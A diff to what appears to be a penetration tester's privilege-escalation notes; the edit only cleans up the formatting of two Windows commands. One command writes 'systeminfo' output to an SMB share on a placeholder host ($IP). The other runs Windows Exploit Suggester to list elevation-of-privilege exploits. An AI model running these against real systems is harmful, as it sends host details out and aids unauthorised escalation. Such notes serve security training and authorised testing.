@@ -106,9 +106,8 @@ yourself write access
 
 				- Commands
 
-					- > systeminfo > \\$IP\$MY_DIRECTORY\systeminfo.txt
-					- # python wes.py systeminfo.txt -i 'Elevation
-of Privilege' --exploits-only | less
+					- systeminfo > \\$IP\$MY_DIRECTORY\systeminfo.txt
+					- python wes.py systeminfo.txt -i 'Elevation of Privilege' --exploits-only | less
 
 				- URL
 
